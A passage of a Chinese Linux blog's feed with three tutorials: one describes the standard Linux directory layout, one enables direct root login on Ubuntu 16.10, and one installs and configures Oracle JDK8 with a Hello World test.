<h3 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a>/tmp</h3><p>该目录用于存放临时文件，有时用户运行程序的时候，会产生一些临时文件。/tmp就是用来存放临时文件的。/var/tmp目录和该目录的作用是相似的。</p>
<h3 id="lost-found"><a href="#lost-found" class="headerlink" title="/lost+found"></a>/lost+found</h3><p>在ext2或ext3文件系统中，当系统意外崩溃或机器意外关机，而产生的一些文件碎片就存放在该目录中。当系统启动在过程中fsck工具会检查这里，并修复已经损坏的文件系统。 有时系统发生问题，有很多的文件被移到这个目录中，可能要用手工的方式来修复，或移到文件原来的位置上。</p>
<h3 id="lib"><a href="#lib" class="headerlink" title="/lib"></a>/lib</h3><p>该目录用于存放库文件，这个目录里存放着系统最基本的共享库，其作用类似于Windows里的.dll文件。几乎所有的应用程序都须要用到这些共享库。</p>
<h3 id="mnt"><a href="#mnt" class="headerlink" title="/mnt"></a>/mnt</h3><p>该目录是用于存放挂载储存设备的挂载目录的，系统提供这个目录是让用户临时挂载别的文件系统，比如有cdrom等目录。</p>
<h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>操作系统运行时，进程（正在运行中的程序）信息及内核信息（比如cpu、硬盘分区、内存信息等）存放在这里。/proc目录是伪装的文件系统proc的挂载目录，proc并不是真正的文件系统。因此，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。也就是说，这个目录的内容不在硬盘上而是在内存里。</p>
<h3 id="misc"><a href="#misc" class="headerlink" title="/misc"></a>/misc</h3><p>该目录可以用来存放杂项文件或目录，即那些用途或含义不明确的文件或目录可以存放在该目录下。</p>
<h3 id="media"><a href="#media" class="headerlink" title="/media"></a>/media</h3><p>即插即用型存储设备的挂载点自动在该目录下创建。比如USB盘系统自动挂载后，会在这个目录下产生一个目录；CDROM/DVD自动挂载后，也会在这个目录中创建一个目录，类似于cdrom这个目录。该目录只有在最新的发行套件上才有。</p>
<h2 id="其余目录"><a href="#其余目录" class="headerlink" title="其余目录"></a>其余目录</h2><h3 id="initrd"><a href="#initrd" class="headerlink" title="/initrd"></a>/initrd</h3><p>系统在启动前的内核是压缩的（这和ramdisk有关），当系统启动时需要解压缩，该目录就是解压缩时的临时目录，当启动完后又将该目录清空。</p>
<h3 id="usr-man"><a href="#usr-man" class="headerlink" title="/usr/man"></a>/usr/man</h3><p>该目录是Linux系统帮助文档的存放目录。</p>
<h3 id="proc-cpuinfo"><a href="#proc-cpuinfo" class="headerlink" title="/proc/cpuinfo"></a>/proc/cpuinfo</h3><p>关于处理器的信息，如类型、厂家、型号和性能等。比如cat /proc/cpuinfo    </p>
<h3 id="proc-devices"><a href="#proc-devices" class="headerlink" title="/proc/devices"></a>/proc/devices</h3><p>当前运行内核所配置的所有设备清单。    </p>
<h3 id="proc-filesystems"><a href="#proc-filesystems" class="headerlink" title="/proc/filesystems"></a>/proc/filesystems</h3><p>当前运行内核所配置的文件系统。    </p>
<h3 id="proc-dma"><a href="#proc-dma" class="headerlink" title="/proc/dma"></a>/proc/dma</h3><p>当前正在使用的DMA通道。    </p>
<h3 id="proc-interrupts"><a href="#proc-interrupts" class="headerlink" title="/proc/interrupts"></a>/proc/interrupts</h3><p>正在使用的中断和曾经有多少个中断。    </p>
<h3 id="proc-ioports"><a href="#proc-ioports" class="headerlink" title="/proc/ioports"></a>/proc/ioports</h3><p>当前正在使用的I/O端口。    </p>
<h3 id="etc-init-d"><a href="#etc-init-d" class="headerlink" title="/etc/init.d"></a>/etc/init.d</h3><p>这个目录是用来存放系统或服务器以System V模式启动的脚本，这在以System V模式启动或初始化的系统中常见。比如RedHat Fedora。    </p>
<h3 id="etc-xinetd-d"><a href="#etc-xinetd-d" class="headerlink" title="/etc/xinetd.d"></a>/etc/xinetd.d</h3><p>如果服务器是通过xinetd模式运行的，它的脚本要放在这个目录下。有些系统没有这个目录，比如Slackware，有些老的版本也没有。在Redhat Fedora中比较新的版本中存在。    </p>
<h3 id="etc-rc-d"><a href="#etc-rc-d" class="headerlink" title="/etc/rc.d"></a>/etc/rc.d</h3><p>这是Slackware发行版中有的一个目录，是BSD方式启动脚本的存放地，比如定义网卡，服务器开启脚本等。    </p>
<h3 id="etc-X11"><a href="#etc-X11" class="headerlink" title="/etc/X11"></a>/etc/X11</h3><p>是X-Window相关的配置文件存放地。    </p>
<h3 id="usr-bin"><a href="#usr-bin" class="headerlink" title="/usr/bin"></a>/usr/bin</h3><p>这个目录是可执行程序的目录，普通用户就有权限执行。当我们从系统自带的软件包安装一个程序时，他的可执行文件大多会放在这个目录。相似的目录是/usr/local/bin目录。有时/usr/bin中的文件是/usr/local/bin的链接文件。    </p>
<h3 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="/usr/sbin"></a>/usr/sbin</h3><p>这个目录也是可执行程序的目录，但大多存放涉及系统管理的命令。只有root权限才能执行，相似目录是/sbin或/usr/local/sbin或/usr/X11R6/sbin等。    </p>
<h3 id="usr-local"><a href="#usr-local" class="headerlink" title="/usr/local"></a>/usr/local</h3><p>这个目录一般是用来存放用户自编译安装软件的存放目录。一般是通过源码包安装的软件，如果没有特别指定安装目录的话，一般是安装在这个目录中。    </p>
<h3 id="usr-lib"><a href="#usr-lib" class="headerlink" title="/usr/lib"></a>/usr/lib</h3><p>该目录和/lib目录相似，是库文件的存储目录。存放一些常用的共享库。    </p>
<h3 id="usr-share"><a href="#usr-share" class="headerlink" title="/usr/share"></a>/usr/share</h3><p>该目录用于存放系统共用的东西，比如/usr/share/fonts是字体目录，是用户都共用的。    </p>
<h3 id="usr-share-doc"><a href="#usr-share-doc" class="headerlink" title="/usr/share/doc"></a>/usr/share/doc</h3><p>该目录是Linux共享文档的存放地。    </p>
<h3 id="usr-share-man"><a href="#usr-share-man" class="headerlink" title="/usr/share/man"></a>/usr/share/man</h3><p>该目录是共享的帮助文件的存放地。    </p>
<h3 id="usr-src"><a href="#usr-src" class="headerlink" title="/usr/src"></a>/usr/src</h3><p>该目录是内核源码存放地，下面有内核源码目录，比如linux、linux-2.xxx.xx目录等。有的系统也会把一些源码软件包安装在这里，比如Redhat Fedora。另外Redhat 4.0/5.0，它的内核源码包的目录位于/usr/src/kernels目录下的某个目录中（只有安装后才会生成相应目录）。    </p>
<h3 id="var-adm"><a href="#var-adm" class="headerlink" title="/var/adm"></a>/var/adm</h3><p>比如软件包安装信息、日志、管理信息等就存放在该目录下，在Slackware操作系统中是有这个目录的。在Fedora中好象没有。    　</p>
<h3 id="var-log"><a href="#var-log" class="headerlink" title="/var/log"></a>/var/log</h3><p>该目录用于存放系统日志。    </p>
<h3 id="var-spool"><a href="#var-spool" class="headerlink" title="/var/spool"></a>/var/spool</h3><p>打印机、邮件、代理服务器等假脱机目录存放在该目录下。</p>
<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/2011110620371927.png" alt=""></p>
<p>转载自 <a href="http://www.cnblogs.com/shishm/" target="_blank" rel="external">时邵猛</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu 16.10下root用户直接登录</title>
    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-Ubuntu-16-10%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95.html"/>
    <id>http://uknowsec.cn/posts/linux/第四周-Ubuntu-16-10下root用户直接登录.html</id>
    <published>2017-03-17T12:38:37.000Z</published>
    <updated>2017-05-01T13:49:39.234Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>使用如下命令设置root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo passwd root</div></pre></td></tr></table></figure></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用如下命令测试是否可以进入root用户，如果@前的用户名变为root则说明设置成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">su root</div></pre></td></tr></table></figure></p>
<h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><p>进入到进入到/usr/share/lightdm/lightdm.conf.d/目录,使用如下命令打开此文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gedit 50-unity-greeter.conf</div></pre></td></tr></table></figure></p>
<p>在此文件中添加如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user-session=ubuntu</div><div class="line">greeter-show-manual-login=true</div><div class="line">all-guest=false</div></pre></td></tr></table></figure></p>
<h3 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h3><p>点击登录，然后输入root用户，再输入前面设置的密码</p>
<h3 id="修复错误"><a href="#修复错误" class="headerlink" title="修复错误"></a>修复错误</h3><p>登录系统后会出现：读取/root/.profile时发现错误的对话框<br>点击确定进入系统，使用如下命令修改文件，找到mesg n，修改为：tty -s &amp;&amp; mesg n<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gedit /root/.profile</div></pre></td></tr></table></figure></p>
<p>保存退出，重启系统即可。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu 16.10下JDK8的安装配置</title>
    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8BJDK8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE.html"/>
    <id>http://uknowsec.cn/posts/linux/第三周-Ubuntu-16-10下JDK8的安装配置.html</id>
    <published>2017-03-12T04:29:39.000Z</published>
    <updated>2017-05-01T13:49:44.914Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="JDK8安装"><a href="#JDK8安装" class="headerlink" title="JDK8安装"></a>JDK8安装</h2><p>安装只需输入命令即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo add-apt-repository ppa:webupd8team/java  </div><div class="line">sudo apt-get update  </div><div class="line">sudo apt-get install oracle-java8-installer</div></pre></td></tr></table></figure>
<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -version</div></pre></td></tr></table></figure></p>
<p>如果显示版本信息则安装成功</p>
<h2 id="配置-JAVA-HOME环境变量"><a href="#配置-JAVA-HOME环境变量" class="headerlink" title="配置$JAVA_HOME环境变量"></a>配置$JAVA_HOME环境变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vi /etc/environment   //前提安装vim</div></pre></td></tr></table></figure>
<p>在文件中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">JAVA_HOME=&quot;/usr/lib/jvm/java-8-oracle&quot;</div></pre></td></tr></table></figure></p>
<p>保存退出，输入下面的命令使修改生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:wq</div><div class="line">source /etc/environment</div></pre></td></tr></table></figure></p>
<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo $JAVA_HOME</div></pre></td></tr></table></figure></p>
<p>若显示刚才添加的路径则说明配置成功。</p>
<h2 id="简单编译运行"><a href="#简单编译运行" class="headerlink" title="简单编译运行"></a>简单编译运行</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public class test &#123;</div><div class="line"></div><div class="line">   /*</div><div class="line">    * 输出一行字符串“Hello World!”</div><div class="line">    */</div><div class="line"></div><div class="line">    public static void main(String[] args) &#123;</div><div class="line"></div><div class="line">    System.out.println(&quot;Hello World!&quot;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac test.java</div><div class="line">java test</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312124230.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
    
    
  </entry>
  
</feed>
